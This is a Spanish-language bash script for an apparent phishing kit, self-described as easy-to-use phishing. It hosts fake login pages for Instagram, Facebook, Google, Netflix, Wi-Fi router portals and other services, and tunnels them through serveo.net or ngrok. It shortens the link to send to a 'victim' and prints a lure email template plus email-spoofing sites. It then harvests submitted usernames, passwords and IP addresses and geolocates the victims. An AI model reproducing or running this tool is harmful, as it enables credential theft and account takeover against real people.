#!/bin/bash

trap 'printf "\n";stop;exit 1' 2

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {

printf "\e[1;93m\e[0m\e[1;92mPuedes escojer entre Redes Sociales e Inicio de session wifi\e[0m \e[1;93m\e[0m\n"
printf "\n"
printf "\e[1;93m\e[0m\e[1;92m=============================================\e[0m \e[1;93m\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Redes Sociales\e[0m      \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Paginas de Wifi\n"
printf "\e[1;93m\e[0m\e[1;92m=============================================\e[0m \e[1;93m\e[0m\n"

read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoja una de las opciones: \e[0m\en' option


if [[ $option == 1 || $option == 01 ]]; then
menu1

elif [[ $option == 2 || $option == 02 ]]; then
menu2

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] opcion no valida!\e[0m\n"
clear
banner
fi
}

menu1() {

printf "\n"
printf "\e[1;93m\e[0m\e[1;92m=======================================================\e[0m \e[1;93m\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m          \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo           \e[0m\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"
printf "\e[1;93m\e[0m\e[1;92m=======================================================\e[0m \e[1;93m\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoje una opción: \e[0m\en' option
printf "\n"

if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start1

elif [[ $option == 2 || $option == 02 ]]; then
     printf "\e[1;93m\e[0m\e[1;92mPuedes escojer entre direrentes paginas de Facebook\e[0m \e[1;93m\e[0m\n"
     printf "\n"
     printf "\e[1;93m\e[0m\e[1;92m=======================================================\e[0m \e[1;93m\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Facebook_login\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook Hot\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Hacking Publico\e[0m\n"
     printf "\e[1;93m\e[0m\e[1;92m=======================================================\e[0m \e[1;93m\e[0m\n"
    read -p "escoja una opcion: " opt
       if [[ $opt == 1 ]]; then
             server="facebook"
             start1
       elif [[ $opt == 2 ]]; then
             server="facebook1"
             start1
       elif [[ $opt == 3 ]]; then
             server="facebook2"
             start1
       else
       printf "\e[1;93m [!] Invalid option!\e[0m\n"
       menu
       fi
elif [[ $option == 3 || $option == 03 ]]; then
server="snapchat"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="twitter"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="github"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="google"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="spotify"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="netflix"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="origin"
start1

elif [[ $option == 10 ]]; then
server="steam"
start1

elif [[ $option == 11 ]]; then
server="yahoo"
start1

elif [[ $option == 12 ]]; then
server="linkedin"
start1

elif [[ $option == 13 ]]; then
server="protonmail"
start1

elif [[ $option == 14 ]]; then
server="wordpress"
start1

elif [[ $option == 15 ]]; then
server="microsoft"
start1

elif [[ $option == 16 ]]; then
server="instafollowers"
start1

elif [[ $option == 17 ]]; then
server="gitlab"
start1

elif [[ $option == 18 ]]; then
server="pinterest"
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] opcion no valida!\e[0m\n"
sleep 1
clear
menu
fi
}

menu2() {
printf "\n"
printf "\e[1;93m\e[0m\e[1;92m==================================\e[0m \e[1;93m\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Claro\e[0m      \e[1;92m    [\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m HuaweiCnt\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m DirecTV\e[0m        [\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m GoogleWlan\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Movistar\e[1;92m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Telekom\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Telmex\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m TPLink\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Tigo\e[0m\n"
printf "\e[1;93m\e[0m\e[1;92m==================================\e[0m \e[1;93m\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escojer una Opcion: \e[0m\en' option


if [[ $option == 1 || $option == 01 ]]; then
server="Claro"
start1

elif [[ $option == 2 || $option == 02 ]]; then
server="DirecTV"
start1

elif [[ $option == 3 || $option == 03 ]]; then
server="GoogleWlan"
start1
elif [[ $option == 4 || $option == 04 ]]; then
server="Movistar"
start1
elif [[ $option == 5 || $option == 05 ]]; then
server="Telekom"
start1
elif [[ $option == 6 || $option == 06 ]]; then
server="Telmex"
start1

elif [[ $option == 7 || $option == 07 ]]; then
server="Tplink"
start1

elif [[ $option == 8 || $option == 08 ]]; then
server="Tigo"
start1

elif [[ $option == 9 || $option == 09 ]]; then
server="HuaweiCnt"
start1

elif [[ $option == 99 ]]; then
exit 1

else
printf "\e[1;93m [!] opcion no valida!\e[0m\n"
sleep 1
clear
menu
fi
}
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner(){

printf "     \e[1;31m                               ___ ___ _______ ___ ___      \n"
printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
printf "                                       |:  |:  1   |   |:  |    \n"
printf "     \e[0m\e[1;77m Hecho por Javic      \e[1;31m                |::.|::.. . |   |::.|    \n"
printf "                                        --- -------     ---     \n"
                                          
printf "\n"
printf "\e[1;77m       .........\e[0m\e[1;93m Dedicado al Grupo de Error404\e[0m\e[1;77m...........\e[0m\n" 
printf "\e[1;77m       .............\e[0m\e[1;93m Phishing facil de usar \e[0m\e[1;77m.............\e[0m\n"                              
printf "\e[1;93m       .....\e[0m\e[1;92m Porque el conocimiento debe ser libre\e[0m \e[1;93m......\e[0m\n"
printf "\n"

}

catch_cred() {

account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando credenciales y la proxima IPS, Presiona Ctrl + C para salir...\e[0m\n"

}


catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continente:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Pais:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] Estado:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] Ubicacion de la Ciudad:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] Numero AS:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Velocidad:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Moneda:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Esperando Credenciales y a la proxima IPS, Presiona Ctrl + C para salir...\e[0m\n"

}


serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Comenzando servidor PHP...\n"
cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Comenzando servidor...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "Necesita SSH pero no está instalado. Instalarlo. Saliendo."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envía el enlace directo al objetivo:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
printf "\e[1;92m  <h3>solicitamos que verifiques inmeditamente</h3> \e[0m\n"
printf "\e[1;92m  <h3>podria tratarse que alguien ingreso a tu cuenta sin previo aviso</h3> \e[0m\n" 
printf "\e[1;92m  <h3>verifica en el siguiente enlace..</h3> \e[0m\n"
printf "\e[1;92m  <a href='aqui tu enlace'>Aqui</a> \e[0m\n"
checkfound


}

startx() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi

default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escojer un puerto (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}


start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi



if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita unzip pero no está instalado. Instalarlo. Saliendo."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado. Instalarlo. Saliendo."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor PHP...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con Ngrok...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en os siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
printf "\e[1;92m  <h3>solicitamos que verifiques inmeditamente</h3> \e[0m\n"
printf "\e[1;92m  <h3>podria tratarse que alguien ingreso a tu cuenta sin previo aviso</h3> \e[0m\n" 
printf "\e[1;92m  <h3>verifica en el siguiente enlace..</h3> \e[0m\n"
printf "\e[1;92m  <a href='aqui tu enlace'>Aqui</a> \e[0m\n"
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

clear
banner
printf "\n"
printf "\e[1;93m\e[0m\e[1;92mPuedes escojer para el reenvio de puertos una de las opciones\e[0m \e[1;93m\e[0m\n"
printf "\n"
printf "\e[1;93m\e[0m\e[1;92m======================================\e[0m \e[1;93m\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (Tunelización SSH...)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;93m\e[0m\e[1;92m======================================\e[0m \e[1;93m\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escoje una opción: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Puede escojer el nombre del servidor: \e[0m\en' servernombre 
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
start
else
printf "\e[1;93m [!] Opcion Invalida!\e[0m\n"
sleep 1
clear
start1
fi

}
checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando IPs y Crendenciales,\e[0m\e[1;77m Presiona Ctrl + C para salir...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Funcionando!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciales Funcionando!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5


done 

}
banner
dependencies
menu

